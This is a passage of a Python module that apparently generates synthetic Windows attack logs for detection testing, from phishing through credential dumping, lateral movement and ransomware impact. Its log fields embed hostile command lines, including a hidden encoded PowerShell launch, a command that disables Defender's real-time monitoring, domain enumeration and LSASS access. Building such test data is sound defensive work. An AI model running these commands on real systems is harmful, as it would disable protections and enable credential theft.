"""
Main scenario builder that orchestrates attack scenario generation.

Combines environment configuration, attack paths, engagement types,
and templates to produce complete attack scenarios.
"""

import copy
import random
import uuid
from datetime import datetime
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field

from ..config import (
    EnvironmentConfig,
    AttackPathConfig,
    EngagementConfig,
    TimingConfig,
    HostConfig,
    UserConfig,
)
from ..config.models import EngagementType, KillChainPhase
from ..templating import TemplateLibrary, TemplateEngine, AttackTemplate
from ..templating.engine import RenderContext
from .guid_registry import GuidRegistry
from .timestamp_gen import TimestampGenerator


@dataclass
class LogEntry:
    """A single log entry in the scenario."""

    sequence: int
    timestamp: str
    attack_phase: str
    technique: str
    host: str
    comment: str
    log: Dict[str, Any]


@dataclass
class ScenarioMetadata:
    """Metadata for a generated scenario."""

    scenario_name: str
    engagement_type: str
    generated_at: str
    duration: str
    total_logs: int
    hosts_involved: List[str]
    techniques_used: List[str]
    kill_chain_phases: List[str]
    environment_name: str
    generator_version: str = "1.0.0"


@dataclass
class AttackScenario:
    """A complete attack scenario with metadata and logs."""

    metadata: ScenarioMetadata
    logs: List[LogEntry] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization."""
        return {
            "_metadata": {
                "scenario_name": self.metadata.scenario_name,
                "engagement_type": self.metadata.engagement_type,
                "generated_at": self.metadata.generated_at,
                "duration": self.metadata.duration,
                "total_logs": self.metadata.total_logs,
                "hosts_involved": self.metadata.hosts_involved,
                "techniques_used": self.metadata.techniques_used,
                "kill_chain_phases": self.metadata.kill_chain_phases,
                "environment_name": self.metadata.environment_name,
                "generator_version": self.metadata.generator_version,
            },
            "logs": [
                {
                    "_comment": log.comment,
                    "sequence": log.sequence,
                    "timestamp": log.timestamp,
                    "attack_phase": log.attack_phase,
                    "technique": log.technique,
                    "host": log.host,
                    "log": log.log,
                }
                for log in self.logs
            ],
        }


class ScenarioBuilder:
    """
    Orchestrates attack scenario generation.

    Combines configuration, templates, and timing to produce
    realistic multi-phase attack scenarios.
    """

    def __init__(
        self,
        environment: EnvironmentConfig,
        attack_path: AttackPathConfig,
        engagement: EngagementConfig,
        timing: Optional[TimingConfig] = None,
        seed: Optional[int] = None,
    ):
        """
        Initialize the scenario builder.

        Args:
            environment: Environment configuration
            attack_path: Attack path configuration
            engagement: Engagement configuration
            timing: Timing configuration (optional)
            seed: Random seed for reproducibility
        """
        self.environment = environment
        self.attack_path = attack_path
        self.engagement = engagement
        self.timing = timing or TimingConfig()

        self.guid_registry = GuidRegistry()
        self.timestamp_gen = TimestampGenerator(self.timing, seed=seed)
        self.template_library = TemplateLibrary()
        self.template_engine = TemplateEngine()

        self._logs: List[LogEntry] = []
        self._sequence = 0
        self._techniques_used: set = set()
        self._phases_used: set = set()

        if seed is not None:
            random.seed(seed)

    def build(self) -> AttackScenario:
        """
        Build the complete attack scenario.

        Returns:
            Generated AttackScenario
        """
        # Index templates
        self.template_library.index()

        # Start timing
        self.timestamp_gen.start()

        # Build scenario based on engagement type
        if self.engagement.type == EngagementType.RANSOMWARE:
            self._build_ransomware_scenario()
        elif self.engagement.type == EngagementType.EXFILTRATION:
            self._build_exfiltration_scenario()
        elif self.engagement.type == EngagementType.PERSISTENT_C2:
            self._build_persistent_c2_scenario()
        elif self.engagement.type == EngagementType.INSIDER_THREAT:
            self._build_insider_threat_scenario()
        elif self.engagement.type == EngagementType.BUSINESS_EMAIL_COMPROMISE:
            self._build_bec_scenario()

        # Calculate duration
        if self._logs:
            start_time = datetime.fromisoformat(self._logs[0].timestamp.rstrip("Z"))
            end_time = datetime.fromisoformat(self._logs[-1].timestamp.rstrip("Z"))
            duration = end_time - start_time
            duration_str = self._format_duration(duration)
        else:
            duration_str = "0s"

        # Build metadata
        metadata = ScenarioMetadata(
            scenario_name=f"{self.engagement.type.value.replace('_', ' ').title()} - {self.environment.name}",
            engagement_type=self.engagement.type.value,
            generated_at=datetime.utcnow().isoformat() + "Z",
            duration=duration_str,
            total_logs=len(self._logs),
            hosts_involved=self.attack_path.get_hosts_in_order(),
            techniques_used=sorted(self._techniques_used),
            kill_chain_phases=sorted(self._phases_used),
            environment_name=self.environment.name,
        )

        return AttackScenario(metadata=metadata, logs=self._logs)

    def _format_duration(self, duration) -> str:
        """Format timedelta as human-readable string."""
        total_seconds = int(duration.total_seconds())

        if total_seconds < 60:
            return f"{total_seconds}s"
        elif total_seconds < 3600:
            return f"{total_seconds // 60}m {total_seconds % 60}s"
        elif total_seconds < 86400:
            hours = total_seconds // 3600
            mins = (total_seconds % 3600) // 60
            return f"{hours}h {mins}m"
        else:
            days = total_seconds // 86400
            hours = (total_seconds % 86400) // 3600
            return f"{days}d {hours}h"

    def _add_log(
        self,
        phase: str,
        technique: str,
        host: str,
        log_data: Dict[str, Any],
        comment: str,
    ) -> None:
        """Add a log entry to the scenario."""
        self._sequence += 1
        timestamp = self.timestamp_gen.current()

        log_entry = LogEntry(
            sequence=self._sequence,
            timestamp=timestamp.isoformat() + "Z",
            attack_phase=phase,
            technique=technique,
            host=host,
            comment=comment,
            log=log_data,
        )

        self._logs.append(log_entry)
        self._techniques_used.add(technique)
        self._phases_used.add(phase)

    def _get_render_context(
        self,
        host: HostConfig,
        user: Optional[UserConfig] = None,
        parent_guid: Optional[str] = None,
        dest_host: Optional[HostConfig] = None,
    ) -> RenderContext:
        """Build render context for template."""
        if user is None:
            # Pick a random user from the host or environment
            if host.users:
                username = random.choice(host.users)
                user = self.environment.get_user(username)
            elif self.environment.users:
                user = random.choice(self.environment.users)

        username = user.username if user else "SYSTEM"
        user_domain = self.environment.domain.split(".")[0].upper()

        # Generate process GUID
        guid = self.guid_registry.generate_guid(
            host=host.short_name,
            parent_guid=parent_guid,
            user=f"{user_domain}\\{username}",
        )

        # Get parent info
        parent_pid = self.guid_registry.get_parent_pid(guid)

        # C2 info
        c2_ip = self.environment.c2.ip if self.environment.c2 else None
        c2_domain = self.environment.c2.domain if self.environment.c2 else None
        c2_port = self.environment.c2.port if self.environment.c2 else 443

        return RenderContext(
            hostname=host.hostname,
            short_name=host.short_name,
            domain=self.environment.domain,
            agent_name=host.agent_name or host.short_name,
            agent_id=host.agent_id or "001",
            ip=host.ip,
            username=username,
            user_domain=user_domain,
            guid=guid,
            parent_guid=parent_guid,
            pid=self.guid_registry.get_pid(guid),
            parent_pid=parent_pid,
            timestamp=self.timestamp_gen.current(),
            source_ip=host.ip,
            dest_ip=dest_host.ip if dest_host else c2_ip,
            dest_hostname=dest_host.hostname if dest_host else c2_domain,
            dest_port=dest_host and 445 or c2_port,  # SMB for lateral, C2 otherwise
            c2_ip=c2_ip,
            c2_domain=c2_domain,
            c2_port=c2_port,
        )

    def _build_ransomware_scenario(self) -> None:
        """Build a ransomware attack scenario."""
        # Phase 1: Initial Access
        self._build_initial_access()

        # Phase 2: Execution
        self.timestamp_gen.next(phase_transition=("initial-access", "execution"))
        self._build_execution()

        # Phase 3: Persistence
        self.timestamp_gen.next(phase_transition=("execution", "persistence"))
        self._build_persistence()

        # Phase 4: Privilege Escalation
        self.timestamp_gen.next(phase_transition=("persistence", "privilege-escalation"))
        self._build_privilege_escalation()

        # Phase 5: Discovery
        self.timestamp_gen.next(phase_transition=("privilege-escalation", "discovery"))
        self._build_discovery()

        # Phase 6: Credential Access
        self.timestamp_gen.next(phase_transition=("discovery", "credential-access"))
        self._build_credential_access()

        # Phase 7: Lateral Movement
        self.timestamp_gen.next(phase_transition=("credential-access", "lateral-movement"))
        self._build_lateral_movement()

        # Phase 8: Defense Evasion
        self.timestamp_gen.next()
        self._build_defense_evasion()

        # Phase 9: Collection
        self.timestamp_gen.next(phase_transition=("defense-evasion", "collection"))
        self._build_collection()

        # Phase 10: Impact (Ransomware)
        self.timestamp_gen.next(phase_transition=("collection", "impact"))
        self._build_ransomware_impact()

    def _build_exfiltration_scenario(self) -> None:
        """Build a data exfiltration scenario."""
        self._build_initial_access()

        self.timestamp_gen.next(phase_transition=("initial-access", "execution"))
        self._build_execution()

        self.timestamp_gen.next(phase_transition=("execution", "persistence"))
        self._build_persistence()

        self.timestamp_gen.next(phase_transition=("persistence", "privilege-escalation"))
        self._build_privilege_escalation()

        self.timestamp_gen.next(phase_transition=("privilege-escalation", "discovery"))
        self._build_discovery()

        self.timestamp_gen.next(phase_transition=("discovery", "credential-access"))
        self._build_credential_access()

        self.timestamp_gen.next(phase_transition=("credential-access", "lateral-movement"))
        self._build_lateral_movement()

        self.timestamp_gen.next(phase_transition=("lateral-movement", "collection"))
        self._build_collection()

        self.timestamp_gen.next(phase_transition=("collection", "command-and-control"))
        self._build_c2_beacon()

        self.timestamp_gen.next(phase_transition=("command-and-control", "exfiltration"))
        self._build_exfiltration()

    def _build_persistent_c2_scenario(self) -> None:
        """Build an APT persistent C2 scenario."""
        self._build_initial_access()

        self.timestamp_gen.next(phase_transition=("initial-access", "execution"))
        self._build_execution()

        self.timestamp_gen.next(phase_transition=("execution", "persistence"))
        self._build_persistence()

        self.timestamp_gen.next(phase_transition=("persistence", "command-and-control"))
        self._build_c2_beacon()

        self.timestamp_gen.next(phase_transition=("command-and-control", "privilege-escalation"))
        self._build_privilege_escalation()

        self.timestamp_gen.next(phase_transition=("privilege-escalation", "discovery"))
        self._build_discovery()

        self.timestamp_gen.next(phase_transition=("discovery", "credential-access"))
        self._build_credential_access()

        self.timestamp_gen.next(phase_transition=("credential-access", "lateral-movement"))
        self._build_lateral_movement()

        self.timestamp_gen.next(phase_transition=("lateral-movement", "defense-evasion"))
        self._build_defense_evasion()

        self.timestamp_gen.next(phase_transition=("defense-evasion", "collection"))
        self._build_collection()

        # Multiple beacons over time (APT dwell time simulation)
        for _ in range(3):
            self.timestamp_gen.skip_to_next_day()
            self._build_c2_beacon()

        # Final exfiltration
        self.timestamp_gen.next(phase_transition=("command-and-control", "exfiltration"))
        self._build_exfiltration()

    def _build_insider_threat_scenario(self) -> None:
        """Build an insider threat scenario."""
        # Insider already has access - start with discovery
        self._build_discovery()

        self.timestamp_gen.next(phase_transition=("discovery", "privilege-escalation"))
        self._build_privilege_escalation()

        self.timestamp_gen.next(phase_transition=("privilege-escalation", "credential-access"))
        self._build_credential_access()

        self.timestamp_gen.next(phase_transition=("credential-access", "collection"))
        self._build_collection()

        self.timestamp_gen.next(phase_transition=("collection", "exfiltration"))
        self._build_exfiltration()

    # ============================================================
    # Phase Builders
    # ============================================================

    def _build_initial_access(self) -> None:
        """Build initial access phase logs with multiple vectors."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # Get initial access template
        templates = self.template_library.get_by_phase("initial-access")
        if templates:
            template = random.choice(templates)
            self._render_and_add_template(template, host)
            self.timestamp_gen.next()

        # Spearphishing link (browser to PowerShell)
        self._create_spearphishing_link_log(host)
        self.timestamp_gen.next()

        # Basic phishing attachment
        self._create_basic_phishing_log(host)
        self.timestamp_gen.next()

        # External remote service (RDP from external IP)
        self._create_external_remote_service_log(host)
        self.timestamp_gen.next()

        # Exploit public-facing application (web shell)
        if host.role.value == "web_server":
            self._create_exploit_public_app_log(host)

    def _build_execution(self) -> None:
        """Build execution phase logs with multiple techniques."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # 1. PowerShell execution from Office macro
        self._create_powershell_execution_log(host)
        self.timestamp_gen.next()

        # 2. AMSI bypass
        self._create_amsi_bypass_log(host)
        self.timestamp_gen.next()

        # 3. LOLBin download cradles
        self._create_certutil_download_log(host)
        self.timestamp_gen.next()
        self._create_bitsadmin_download_log(host)
        self.timestamp_gen.next()

        # 4. MSHTA execution
        self._create_mshta_execution_log(host)

    def _build_persistence(self) -> None:
        """Build persistence phase logs."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # Generate registry persistence
        self._create_registry_persistence_log(host)

    def _build_privilege_escalation(self) -> None:
        """Build privilege escalation phase logs."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # UAC bypass
        self._create_uac_bypass_log(host)
        self.timestamp_gen.next()

        # DLL hijacking
        self._create_dll_hijack_log(host)
        self.timestamp_gen.next()

        # Named pipe impersonation for SYSTEM
        self._create_named_pipe_impersonation_log(host)

    def _build_discovery(self) -> None:
        """Build discovery phase logs with comprehensive enumeration."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # 1. Basic discovery commands (whoami, net user, net group)
        self._create_discovery_logs(host)
        self.timestamp_gen.next()

        # 2. Active Directory reconnaissance
        self._create_ad_recon_log(host)

    def _build_credential_access(self) -> None:
        """Build credential access phase logs with multiple techniques."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # 1. LSASS memory dump via comsvcs.dll
        self._create_lsass_dump_log(host)
        self.timestamp_gen.next()

        # 2. Mimikatz sekurlsa::logonpasswords
        self._create_mimikatz_sekurlsa_log(host)
        self.timestamp_gen.next()

        # 3. SAM database dump
        self._create_sam_dump_log(host)
        self.timestamp_gen.next()

        # 4. Kerberoasting
        self._create_kerberoasting_log(host)

    def _build_lateral_movement(self) -> None:
        """Build lateral movement phase logs with DC-specific attacks."""
        pivots = [step for step in self.attack_path.path if step.pivot_from]

        for pivot in pivots:
            source_host = self.environment.get_host(pivot.pivot_from)
            target_host = self.environment.get_host(pivot.host)
            if source_host and target_host:
                self._create_lateral_movement_log(source_host, target_host)
                self.timestamp_gen.next()

                # If target is a domain controller, perform DC-specific attacks
                if target_host.role.value == "domain_controller":
                    # DCSync attack
                    self._create_dcsync_log(source_host)
                    self.timestamp_gen.next()

                    # NTDS.dit extraction
                    self._create_ntds_dump_log(target_host)
                    self.timestamp_gen.next()

    def _build_defense_evasion(self) -> None:
        """Build defense evasion phase logs with multiple techniques."""
        entry_host_name = self.attack_path.entry_point
        entry_host = self.environment.get_host(entry_host_name)

        # Entry host: LOLBin execution for defense evasion
        if entry_host and entry_host.os.value == "windows":
            self._create_rundll32_execution_log(entry_host)
            self.timestamp_gen.next()
            self._create_regsvr32_execution_log(entry_host)
            self.timestamp_gen.next()

        # Disable Defender on all compromised hosts
        for step in self.attack_path.path:
            host = self.environment.get_host(step.host)
            if host and host.os.value == "windows":
                self._create_disable_defender_log(host)
                self.timestamp_gen.next()

    def _build_collection(self) -> None:
        """Build collection phase logs."""
        # Find file server or target host
        target_host = None
        for step in reversed(self.attack_path.path):
            host = self.environment.get_host(step.host)
            if host and host.role.value == "file_server":
                target_host = host
                break
        if not target_host:
            target_host = self.environment.get_host(self.attack_path.path[-1].host)

        if target_host:
            # Screenshot capture
            self._create_screenshot_log(target_host)
            self.timestamp_gen.next()

            # Keylogger
            self._create_keylogger_log(target_host)
            self.timestamp_gen.next()

            # Local data collection
            self._create_local_data_collection_log(target_host)
            self.timestamp_gen.next()

            # Network share collection
            self._create_network_share_collection_log(target_host)
            self.timestamp_gen.next()

            # Archive collected data
            self._create_archive_log(target_host)

    def _build_exfiltration(self) -> None:
        """Build exfiltration phase logs."""
        # Exfil from last host in path
        last_host = self.environment.get_host(self.attack_path.path[-1].host)
        if last_host:
            # DNS tunneling exfiltration
            self._create_dns_tunneling_log(last_host)
            self.timestamp_gen.next()

            # Exfiltration over C2 channel
            self._create_exfil_over_c2_log(last_host)
            self.timestamp_gen.next()

            # Standard exfil log
            self._create_exfil_log(last_host)

    def _build_c2_beacon(self) -> None:
        """Build C2 beacon logs."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if host:
            # Encrypted C2 channel
            self._create_encrypted_channel_log(host)
            self.timestamp_gen.next()

            # Protocol tunneling (SSH)
            self._create_protocol_tunneling_log(host)
            self.timestamp_gen.next()

            # Standard C2 beacon
            self._create_c2_beacon_log(host)

    def _build_ransomware_impact(self) -> None:
        """Build ransomware impact logs (encryption) with comprehensive attack chain."""
        # Execute on all compromised hosts
        for step in self.attack_path.path:
            host = self.environment.get_host(step.host)
            if host and host.os.value == "windows":
                # 1. Stop backup and security services
                self._create_stop_services_log(host)
                self.timestamp_gen.next()

                # 2. Kill security processes
                self._create_process_termination_log(host)
                self.timestamp_gen.next()

                # 3. Delete shadow copies (multiple methods)
                self._create_shadow_delete_log(host)  # vssadmin
                self.timestamp_gen.next()
                self._create_wmic_shadow_delete_log(host)  # wmic
                self.timestamp_gen.next()

                # 4. Disable Windows recovery
                self._create_bcdedit_recovery_disable_log(host)
                self.timestamp_gen.next()

                # 5. Data destruction (secure delete)
                self._create_data_destruction_log(host)
                self.timestamp_gen.next()

                # 6. Encrypt files
                self._create_encryption_log(host)
                self.timestamp_gen.next()

                # 7. Web defacement (if web server)
                if host.role.value == "web_server":
                    self._create_defacement_log(host)
                    self.timestamp_gen.next()

    def _build_destructive_impact(self) -> None:
        """Build destructive impact logs (disk wipe, data destruction)."""
        for step in self.attack_path.path:
            host = self.environment.get_host(step.host)
            if host and host.os.value == "windows":
                # Data destruction
                self._create_data_destruction_log(host)
                self.timestamp_gen.next()

                # Disk wipe
                self._create_disk_wipe_log(host)
                self.timestamp_gen.next()

                # Defacement
                self._create_defacement_log(host)
                self.timestamp_gen.next()

    # ============================================================
    # Log Creation Helpers
    # ============================================================

    def _render_and_add_template(self, template: AttackTemplate, host: HostConfig) -> None:
        """Render a template and add its logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        for log_template in template.logs:
            rendered = self.template_engine.render(log_template.get("log", {}), context)
            self._add_log(
                phase=template.kill_chain_phase,
                technique=template.attack_id,
                host=host.short_name,
                log_data=rendered,
                comment=log_template.get("_comment", template.name),
            )
            self.timestamp_gen.next()

    def _create_basic_phishing_log(self, host: HostConfig) -> None:
        """Create a basic phishing initial access log."""
        context = self._get_render_context(host)

        log_data = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    "CommandLine": f'"WINWORD.EXE" /n "C:\\Users\\{context.username}\\Downloads\\Invoice.docm"',
                    "User": f"{context.user_domain}\\{context.username}",
                    "ParentProcessGuid": context.parent_guid or "{00000000-0000-0000-0000-000000000000}",
                    "ParentImage": "C:\\Windows\\explorer.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1566.001",
            host=host.short_name,
            log_data=log_data,
            comment="Phishing attachment opened",
        )

    def _create_powershell_execution_log(self, host: HostConfig) -> None:
        """Create PowerShell execution log with paired Sysmon + Windows Security events."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Sysmon Event 1 - Process Create
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "Hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
                    "ParentProcessGuid": context.parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    "ParentCommandLine": f'"WINWORD.EXE" /n "C:\\Users\\{context.username}\\Downloads\\Invoice.docm"',
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="execution",
            technique="T1059.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="PowerShell execution from Office macro (Sysmon)",
        )

        # Windows Security Event 4688 - Process Creation
        self.timestamp_gen.next()
        security_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4688,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
                    "SubjectUserName": context.username,
                    "SubjectDomainName": context.user_domain,
                    "SubjectLogonId": "0x3E7",
                    "NewProcessId": f"0x{context.pid:X}",
                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TokenElevationType": "%%1937",
                    "ProcessId": f"0x{context.parent_pid:X}" if context.parent_pid else "0x0",
                    "CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...",
                    "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
                    "TargetUserName": context.username,
                    "TargetDomainName": context.user_domain,
                    "TargetLogonId": "0x3E7",
                    "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    "MandatoryLabel": "S-1-16-12288",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="execution",
            technique="T1059.001",
            host=host.short_name,
            log_data=security_log,
            comment="PowerShell execution from Office macro (Security)",
        )

    def _create_registry_persistence_log(self, host: HostConfig) -> None:
        """Create registry persistence log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        log_data = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 13,
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "EventType": "SetValue",
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TargetObject": f"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                    "Details": "C:\\Users\\Public\\update.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="persistence",
            technique="T1547.001",
            host=host.short_name,
            log_data=log_data,
            comment="Registry Run key persistence",
        )

    def _create_discovery_logs(self, host: HostConfig) -> None:
        """Create discovery phase logs."""
        commands = [
            ("whoami /all", "T1033"),
            ("net user /domain", "T1087.002"),
            ("net group \"Domain Admins\" /domain", "T1069.002"),
        ]

        parent_guid = self.guid_registry.get_current_process(host.short_name)

        for cmd, technique in commands:
            context = self._get_render_context(host, parent_guid=parent_guid)

            log_data = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": "C:\\Windows\\System32\\cmd.exe",
                        "CommandLine": f"cmd.exe /c {cmd}",
                        "User": f"{context.user_domain}\\{context.username}",
                        "ParentProcessGuid": parent_guid,
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="discovery",
                technique=technique,
                host=host.short_name,
                log_data=log_data,
                comment=f"Discovery command: {cmd.split()[0]}",
            )
            self.timestamp_gen.next()
            parent_guid = context.guid

    def _create_lsass_dump_log(self, host: HostConfig) -> None:
        """Create LSASS memory dump log with paired Sysmon + Windows Security events."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Sysmon Event 10 - Process Access to LSASS
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 10,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "RuleName": "technique_id=T1003,technique_name=Credential Dumping",
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "SourceProcessGUID": context.guid,
                    "SourceProcessId": str(context.pid),
                    "SourceThreadId": str(context.pid),
                    "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
                    "TargetProcessGUID": "{00000000-0000-0000-0000-000000000728}",
                    "TargetProcessId": "728",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1FFFFF",
                    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2bcce|C:\\Windows\\System32\\comsvcs.dll+...",
                    "SourceUser": f"{context.user_domain}\\{context.username}",
                    "TargetUser": "NT AUTHORITY\\SYSTEM",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="LSASS memory access for credential dumping (Sysmon)",
        )

        # Windows Security Event 4663 - Object Access (LSASS)
        self.timestamp_gen.next()
        security_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4663,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
                    "SubjectUserName": context.username,
                    "SubjectDomainName": context.user_domain,
                    "SubjectLogonId": "0x3E7",
                    "ObjectServer": "Security",
                    "ObjectType": "Process",
                    "ObjectName": "\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe",
                    "HandleId": "0x2a8",
                    "AccessList": "%%4416\n\t\t\t\t%%4432\n\t\t\t\t%%4423",
                    "AccessMask": "0x1FFFFF",
                    "ProcessId": f"0x{context.pid:X}",
                    "ProcessName": "C:\\Windows\\System32\\rundll32.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.001",
            host=host.short_name,
            log_data=security_log,
            comment="LSASS memory access for credential dumping (Security)",
        )

    def _create_lateral_movement_log(self, source: HostConfig, target: HostConfig) -> None:
        """Create lateral movement log."""
        parent_guid = self.guid_registry.get_current_process(source.short_name)
        context = self._get_render_context(source, parent_guid=parent_guid, dest_host=target)

        log_data = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": source.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": target.ip,
                    "DestinationHostname": target.hostname,
                    "DestinationPort": "445",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="lateral-movement",
            technique="T1021.002",
            host=source.short_name,
            log_data=log_data,
            comment=f"Lateral movement to {target.short_name} via SMB",
        )

    def _create_disable_defender_log(self, host: HostConfig) -> None:
        """Create Defender disable log with paired Sysmon + Windows Security events."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Sysmon Event 1 - PowerShell disabling Defender
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": 'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true"',
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "Hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentCommandLine": "cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1562.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Disable Windows Defender (Sysmon)",
        )

        # Windows Security Event 4688 - PowerShell process creation
        self.timestamp_gen.next()
        security_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4688,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
                    "SubjectUserName": context.username,
                    "SubjectDomainName": context.user_domain,
                    "SubjectLogonId": "0x3E7",
                    "NewProcessId": f"0x{context.pid:X}",
